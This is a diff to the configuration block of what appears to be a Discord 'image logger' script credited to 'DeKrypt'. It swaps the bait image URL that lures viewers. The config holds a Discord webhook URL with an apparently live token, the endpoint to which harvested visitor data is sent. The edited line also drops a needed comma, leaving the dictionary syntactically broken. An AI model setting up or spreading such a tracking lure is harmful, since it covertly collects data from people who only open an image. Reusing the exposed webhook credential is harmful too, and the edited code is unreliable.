@@ -13,8 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1340725566806167642/ME-rtcpjBs8r16DU4HOglkeSClXYoSQG-SipsfsuxX3txWRUJXLW6tdX7jLqE-Xpu7sF",
-    "image": "https://erepublic.brightspotcdn.com/dims4/default/e43c877/2147483647/strip/true/crop/949x495+0+68/resize/840x438!/quality/90/?url=http%3A%2F%2Ferepublic-brightspot.s3.us-west-2.amazonaws.com%2F63%2F2c%2F0dfdb359b4cd5a3f266bc64e93f7%2Fshutterstock-244924321.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://openautomationsoftware.com/wp-content/uploads/2016/07/JSON-icon-2.jpg"
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
